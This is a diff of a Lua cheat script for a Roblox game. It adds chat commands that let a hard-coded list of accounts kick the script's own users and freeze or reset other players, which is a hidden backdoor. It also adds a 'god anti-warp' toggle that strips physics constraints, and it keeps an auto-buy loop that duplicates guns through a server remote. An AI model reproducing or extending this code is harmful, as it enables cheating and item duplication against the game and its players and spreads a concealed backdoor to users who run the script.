@@ -203,6 +203,10 @@ local stopAllFirefly = false
 local fireflyCount = 100
 local fireflySpawning = false
 
+-- [[ ANTI-WARP VARIABLES ]]
+local antiWarpEnabled = false
+local lastValidPos = nil
+
 ---------------------------------------------------------
 -- [ FUNCTION: UTILS ]
 ---------------------------------------------------------
@@ -272,24 +276,69 @@ local function spawnFireflies(count)
     end)
 end
 
-local scriptAdmins = {"ffsww_1007", "A_ASPD"}
-game.Players.PlayerChatted:Connect(function(chatType, sender, message)
+---------------------------------------------------------
+-- [ UPDATED: ADMIN & CREATOR COMMANDS ]
+---------------------------------------------------------
+local scriptAdmins = {"ffsww_1007", "A_ASPD", "HACKER_18050", "evils915", "Winwie001"}
+
+local function runAdminCommand(sender, message)
     local msg = string.lower(message)
     local parts = string.split(msg, " ")
-    if parts[1] == "!kick" and parts[2] then
-        local targetPart = string.lower(parts[2])
-        local isAdminSender = false
-        for _, adminName in ipairs(scriptAdmins) do
-            if sender.Name == adminName then isAdminSender = true break end
+    local cmd = parts[1]
+    local targetInput = parts[2]
+    
+    local isAdminSender = false
+    for _, adminName in ipairs(scriptAdmins) do
+        if sender.Name == adminName then isAdminSender = true break end
+    end
+
+    if isAdminSender then
+        if cmd == "!cmd" then
+            sendScriptMsg("Commands List", "!kick, !freeze, !r, !firefly, !fireflystop, !fireflyclear")
         end
-        if isAdminSender then
-            if string.find(string.lower(plr.Name), targetPart) then
-                local isMeAdmin = false
-                for _, adminName in ipairs(scriptAdmins) do if plr.Name == adminName then isMeAdmin = true break end end
-                if not isMeAdmin then plr:Kick("\n[Admin System]\nคุณถูกเตะโดยผู้ดูแลระบบ: " .. sender.Name) end
+
+        if targetInput then
+            local targetPlayer = nil
+            for _, p in ipairs(game.Players:GetPlayers()) do
+                if string.find(string.lower(p.Name), string.lower(targetInput)) then
+                    targetPlayer = p
+                    break
+                end
+            end
+
+            if targetPlayer then
+                if cmd == "!kick" then
+                    if targetPlayer == plr then
+                        local isMeAdmin = (plr.Name == "ffsww_1007" or plr.Name == "A_ASPD")
+                        if not isMeAdmin then plr:Kick("\n[Admin System]\nคุณถูกเตะโดย: " .. sender.Name) end
+                    end
+                elseif cmd == "!freeze" then
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        targetPlayer.Character.HumanoidRootPart.Anchored = true
+                        sendScriptMsg("Admin", "Froze " .. targetPlayer.Name)
+                    end
+                elseif cmd == "!r" then
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+                        targetPlayer.Character.Humanoid.Health = 0
+                        sendScriptMsg("Admin", "Reset " .. targetPlayer.Name)
+                    end
+                end
             end
         end
+        
+        if cmd == "!firefly" then spawnFireflies(tonumber(parts[2]) or 100)
+        elseif cmd == "!fireflystop" then stopAllFirefly = true task.wait(0.5) stopAllFirefly = false
+        elseif cmd == "!fireflyclear" then
+            for _, obj in pairs(workspace:GetDescendants()) do if string.find(string.lower(obj.Name), "firefly") then obj:Destroy() end end
+        end
     end
+end
+
+for _, p in ipairs(game.Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg) runAdminCommand(p, msg) end)
+end
+game.Players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(msg) runAdminCommand(p, msg) end)
 end)
 
 plr.Chatted:Connect(function(message)
@@ -535,7 +584,6 @@ shopTab.newToggle("Auto Buy Gun Loop (Max 10)", "Dup up to 10 items per cycle", 
     task.spawn(function()
         local toolStorage = game:GetService("ReplicatedStorage"):WaitForChild("ToolStorage"):WaitForChild("ToolsStorage")
         while autoBuyLoop do
-            -- Step 1: Buy & Save
             for i = 1, 10 do 
                 if not autoBuyLoop then break end 
                 if findAndClick(Vector3.new(-76.84, 162.67, 231.24)) then 
@@ -547,7 +595,6 @@ shopTab.newToggle("Auto Buy Gun Loop (Max 10)", "Dup up to 10 items per cycle", 
             sendScriptMsg("Auto Dup", "Bought & Saved 10 Guns")
             task.wait(0.5)
             
-            -- Step 2: Retrieve
             for i = 1, 10 do 
                 if not autoBuyLoop then break end 
                 toolStorage:FireServer("Get", "Gun") 
@@ -618,6 +665,56 @@ end)
 -- [ TAB 5: MISC ]
 ---------------------------------------------------------
 local miscTab = DrRayLibrary.newTab("Misc", "rbxassetid://10734951151")
+
+-- [[ แก้ไขใหม่: GOD ANTI-WARP SYSTEM ]]
+miscTab.newToggle("GOD ANTI-WARP", "High protection from TP/Force Anchor", false, function(state)
+    antiWarpEnabled = state
+    if state then
+        sendScriptMsg("System", "God Anti-Warp Activated")
+        -- จดจำตำแหน่งล่าสุดที่ปลอดภัย
+        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            lastValidPos = plr.Character.HumanoidRootPart.CFrame
+        end
+        
+        task.spawn(function()
+            while antiWarpEnabled do
+                local char = plr.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                local hum = char and char:FindFirstChild("Humanoid")
+                
+                if hrp and hum and hum.Health > 0 then
+                    -- 1. ป้องกันการถูกล็อคตัว (Anchor)
+                    if hrp.Anchored then 
+                        hrp.Anchored = false 
+                    end
+                    
+                    -- 2. ลบแรงภายนอกที่พยายามดึงตัว (BodyVelocity/Gyro)
+                    for _, obj in ipairs(hrp:GetChildren()) do
+                        if obj:IsA("BodyVelocity") or obj:IsA("BodyGyro") or obj:IsA("RocketPropulsion") then
+                            obj:Destroy()
+                        end
+                    end
+                    
+                    -- 3. ตรวจสอบการเคลื่อนไหวที่ผิดปกติ (วาร์ปไกลเกิน 50 หน่วย)
+                    if lastValidPos then
+                        local dist = (hrp.Position - lastValidPos.Position).Magnitude
+                        -- ถ้าโดนดึงแรงๆ โดยไม่ได้ใช้คำสั่งวาร์ปของตัวเอง
+                        if dist > 50 and not (orbitSpinEnabled or tpAboveHeadEnabled) then
+                            hrp.CFrame = lastValidPos
+                            hrp.Velocity = Vector3.new(0,0,0)
+                        else
+                            -- ถ้าขยับปกติให้จำตำแหน่งล่าสุดไว้
+                            lastValidPos = hrp.CFrame
+                        end
+                    end
+                end
+                RunService.Heartbeat:Wait()
+            end
+        end)
+    else
+        sendScriptMsg("System", "God Anti-Warp Disabled")
+    end
+end)
 
 miscTab.newToggle("Super Speed (80)", "Enable fast run", false, function(state)
     task.spawn(function()
